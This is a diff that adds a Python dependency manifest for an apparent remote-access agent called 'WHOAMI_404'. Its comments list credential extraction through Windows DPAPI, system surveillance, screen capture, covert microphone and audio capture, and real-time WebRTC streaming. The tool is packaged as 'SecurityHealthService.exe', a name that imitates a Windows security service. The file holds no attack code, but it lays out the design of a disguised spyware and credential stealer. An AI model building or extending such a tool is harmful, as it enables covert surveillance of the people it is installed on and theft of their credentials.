@@ -1,0 +1,38 @@
+# ============================================================
+#  WHOAMI_404 AGENT – Runtime & PyInstaller Build Dependencies
+# ============================================================
+
+# Core Network & Socket.IO Communication
+requests>=2.31.0
+urllib3>=1.26.0,<3.0.0
+certifi>=2023.7.22
+python-socketio>=5.9.0
+python-engineio>=4.7.0
+websocket-client>=1.6.0
+websockets>=11.0
+simple-websocket>=0.10.0
+
+# Cryptography, Credential Extraction & DPAPI
+cryptography>=41.0.7
+cffi>=1.15.0
+pywin32>=305                          # Provides win32crypt, win32api, win32con, win32gui, etc.
+
+# System Surveillance & Process Telemetry
+psutil>=5.9.5
+
+# Screen Capture & Vision Processing
+mss>=9.0.1
+dxcam>=0.3.0                          # GPU Desktop Duplication API capture
+opencv-python-headless>=4.8.0.76      # Headless OpenCV for frame encoding
+numpy>=1.24.0,<2.0.0                  # CRITICAL: Locked to 1.x for PyAV/OpenCV/DSP compatibility
+
+# Real-Time WebRTC Media & Audio Surveillance
+PyAudio>=0.2.14                       # Multi-channel microphone capture & WASAPI loopback
+aiortc>=1.6.0                         # Low-latency WebRTC peer connection & media tracks
+av>=11.0.0                            # PyAV FFmpeg audio/video frame muxing & Opus encoding
+aioice>=0.9.0                         # Interactive Connectivity Establishment for WebRTC
+pylibsrtp>=0.8.0                      # Secure Real-Time Transport Protocol (SRTP)
+pyee>=11.0.0                          # Event emitter for asynchronous streams
+
+# Executable Compiler & Standalone Packaging
+PyInstaller>=6.0.0                    # Bundles standalone SecurityHealthService.exe
